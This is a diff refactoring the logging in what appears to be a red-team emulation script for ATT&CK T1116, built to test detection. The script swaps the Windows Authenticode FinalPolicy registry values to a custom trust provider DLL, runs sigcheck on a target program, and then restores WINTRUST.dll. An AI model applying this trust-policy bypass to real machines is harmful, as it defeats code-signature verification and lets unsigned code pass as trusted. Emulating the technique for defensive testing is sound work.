@@ -8,7 +8,11 @@
 # ATT&CK: T1116
 # Description: Substitutes an invalid code authentication policy, enabling trust policy bypass.
 
-from . import _common, RuleMetadata, register_code_rta, OSType
+import logging
+
+from . import OSType, RuleMetadata, _common, register_code_rta
+
+log = logging.getLogger(__name__)
 
 
 if _common.is_64bit():
@@ -28,10 +32,10 @@ def set_final_policy(dll_path, function_name):
     winreg = _common.get_winreg()
     hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, FINAL_POLICY_KEY)
 
-    _common.log("Setting dll path: %s" % dll_path)
+    log.info("Setting dll path: %s" % dll_path)
     winreg.SetValueEx(hkey, "$DLL", 0, winreg.REG_SZ, dll_path)
 
-    _common.log("Setting function name: %s" % function_name)
+    log.info("Setting function name: %s" % function_name)
     winreg.SetValueEx(hkey, "$Function", 0, winreg.REG_SZ, function_name)
 
 
@@ -45,11 +49,11 @@ def set_final_policy(dll_path, function_name):
     ancillary_files=[SIGCHECK_EXE, TRUST_PROVIDER_DLL, TARGET_APP_EXE],
 )
 def main():
-    _common.log("Trust Provider")
+    log.info("Trust Provider")
     set_final_policy(TRUST_PROVIDER_DLL, "FinalPolicy")
 
-    _common.log("Launching sigcheck")
-    _common.execute([SIGCHECK, "-accepteula", TARGET_APP])
+    log.info("Launching sigcheck")
+    _ = _common.execute_command([SIGCHECK, "-accepteula", TARGET_APP])
 
-    _common.log("Cleaning up")
+    log.info("Cleaning up")
     set_final_policy("C:\\Windows\\System32\\WINTRUST.dll", "SoftpubAuthenticode")
